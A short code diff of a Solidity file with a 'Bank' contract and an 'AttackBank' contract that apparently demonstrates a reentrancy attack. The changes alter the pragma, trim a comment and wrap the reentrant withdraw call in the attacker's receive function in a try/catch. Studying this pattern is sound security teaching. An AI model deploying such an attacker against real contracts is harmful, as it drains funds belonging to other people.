@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: MIT
 
-pragma solidity ^0.8.18;
+pragma solidity ^0.8.0;
 
 contract Bank {
     mapping(address => uint256) public balances;
@@ -26,7 +26,7 @@ contract Bank {
 }
 
 contract AttackBank {
-    uint256 public MINIMUM_STEP = 1 * 10**16; // 0.01 ETH (//adjust to contract)
+    uint256 public MINIMUM_STEP = 1 * 10**16; // 0.01 ETH
     Bank public bank;
 
     constructor(address _bank) {
@@ -48,7 +48,7 @@ contract AttackBank {
 
     receive() external payable {
         if (bank.getCurrentBalance() >= MINIMUM_STEP) {
-            bank.withdraw();
+            try bank.withdraw() {} catch {}
         }
     }
 
